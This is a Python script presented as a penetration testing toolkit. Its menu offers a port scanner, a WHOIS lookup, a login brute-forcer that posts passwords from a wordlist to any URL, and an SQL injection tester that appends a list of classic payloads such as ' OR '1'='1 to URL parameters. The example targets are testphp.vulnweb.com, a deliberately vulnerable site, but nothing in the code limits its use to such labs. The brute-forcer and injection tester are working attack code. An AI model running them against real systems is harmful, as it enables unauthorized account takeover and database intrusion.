import socket
import requests
import whois
from datetime import datetime

# ---------- Port Scanner ----------
def port_scanner():
    target = input("Enter target IP or domain (e.g., testphp.vulnweb.com): ").strip()
    target = target.replace("http://", "").replace("https://", "").split("/")[0]
    common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 8080]

    print(f"\n[~] Scanning ports on {target}...\n")
    for port in common_ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                print(f"[+] Port {port} is open")
            else:
                print(f"[-] Port {port} is closed or filtered")
            sock.close()
        except Exception as e:
            print(f"[!] Error scanning port {port}: {e}")

# ---------- Brute Force Login ----------
def brute_forcer():
    url = input("Enter Login URL: ").strip()
    username = input("Enter Username: ").strip()
    wordlist_path = input("Enter path to password wordlist (e.g., passwords.txt): ").strip()

    try:
        with open(wordlist_path, 'r') as file:
            passwords = file.read().splitlines()
    except FileNotFoundError:
        print("[!] Wordlist file not found.")
        return

    for password in passwords:
        data = {'username': username, 'password': password}
        try:
            response = requests.post(url, data=data)
            if "Login failed" not in response.text and response.status_code == 200:
                print(f"[+] SUCCESS! Password found: {password}")
                return
            else:
                print(f"[-] Tried: {password}")
        except Exception as e:
            print(f"[!] Error: {e}")
            return
    print("[-] No valid password found.")

# ---------- WHOIS Lookup ----------
def whois_lookup():
    domain = input("Enter domain (e.g., example.com): ").strip()
    try:
        info = whois.whois(domain)

        def format_date(d):
            if isinstance(d, list):
                return d[0].strftime("%Y-%m-%d %H:%M:%S") if isinstance(d[0], datetime) else str(d[0])
            elif isinstance(d, datetime):
                return d.strftime("%Y-%m-%d %H:%M:%S")
            return str(d)

        def clean_list(lst, max_items=3):
            if not lst:
                return "N/A"
            if isinstance(lst, list):
                trimmed = lst[:max_items]
                extra = f", +{len(lst)-max_items} more" if len(lst) > max_items else ""
                return ", ".join(trimmed) + extra
            return str(lst)

        print("\n[~] WHOIS Info:\n")
        print(f"[+] Domain: {domain}")
        print(f"[+] Registrar: {info.registrar}")
        print(f"[+] Creation Date: {format_date(info.creation_date)}")
        print(f"[+] Expiration Date: {format_date(info.expiration_date)}")
        print(f"[+] Name Servers: {clean_list(info.name_servers)}")
        print(f"[+] Status: {clean_list(info.status)}")
        print(f"[+] Country: {info.country if info.country else 'N/A'}")
        print(f"[+] Emails: {clean_list(info.emails)}")

    except Exception as e:
        print(f"[!] Error fetching WHOIS info: {e}")

# ---------- SQL Injection Tester ----------
def sqli_tester():
    url = input("Enter URL with vulnerable parameter (e.g., http://testphp.vulnweb.com/artists.php?artist=1): ").strip()
    payloads = ["1'", "' OR '1'='1", "'; --", "' OR 1=1#", "' OR 1=1--", "' OR 'a'='a", "' OR 1=1 LIMIT 1 --"]

    print("\n[~] Testing for SQL Injection...\n")
    for payload in payloads:
        test_url = url.replace("=", "=" + payload)
        try:
            res = requests.get(test_url)
            if any(err in res.text.lower() for err in ['sql', 'syntax', 'mysql', 'error']):
                print(f"[+] Potential SQLi vulnerability detected with payload: {payload}")
        except Exception as e:
            print(f"[!] Error testing payload '{payload}': {e}")

# ---------- Menu ----------
def main():
    while True:
        print("\n=== 🛠 PENETRATION TESTING TOOLKIT ===")
        print("1. Port Scanner")
        print("2. Brute Force Login")
        print("3. WHOIS Lookup")
        print("4. SQL Injection Tester")
        print("5. Exit")

        choice = input("\nEnter your choice: ").strip()

        if choice == '1':
            port_scanner()
        elif choice == '2':
            brute_forcer()
        elif choice == '3':
            whois_lookup()
        elif choice == '4':
            sqli_tester()
        elif choice == '5':
            print("Exiting Toolkit.")
            break
        else:
            print("[!] Invalid choice. Try again.")

# ---------- Run ----------
if __name__ == "__main__":
    main()
